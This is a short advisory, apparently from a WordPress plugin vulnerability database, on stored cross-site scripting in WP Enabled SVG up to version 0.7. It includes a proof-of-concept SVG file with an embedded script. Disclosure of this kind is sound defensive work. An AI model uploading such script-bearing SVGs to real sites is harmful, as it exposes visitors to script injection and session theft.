## WordPress Plugin Vulnerabilities

# WP Enabled SVG <= 0.7 - Author+ Stored XSS via SVG

### Description

The plugin does not sanitize SVG files when uploaded, allowing for authors and above to upload SVGs containing malicious scripts

### Proof of Concept

An author can upload a SVG file containing this:
```
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
alert('xss');
</script>
</svg>
```
If someone browses to the URL of uploaded SVG file, the malicious JS is executed.

### Affects Plugins
